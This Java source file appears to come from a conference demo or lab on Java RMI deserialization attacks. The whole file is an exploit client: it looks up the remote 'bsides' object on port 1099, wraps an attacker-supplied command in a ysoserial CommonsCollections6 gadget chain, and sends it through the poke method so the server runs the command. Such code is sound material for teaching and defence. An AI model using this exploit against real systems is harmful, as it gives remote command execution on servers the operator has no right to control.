package de.mogwailabs.BSidesRMIService;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import ysoserial.payloads.CommonsCollections6;

public class AttackClient {

	public static void main(String[] args) {

		try {
			String serverIP = args[0];
			int serverPort = 1099;
			
			// Lookup the remote object that is registered as "bsides"
			Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
			IBSidesService bsides = (IBSidesService) registry.lookup("bsides");

			// create the malicious object via ysososerial
			Object payload = new CommonsCollections6().getObject(args[2]);
			
			// pass it to the target by calling the Poke method
			bsides.poke(payload);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}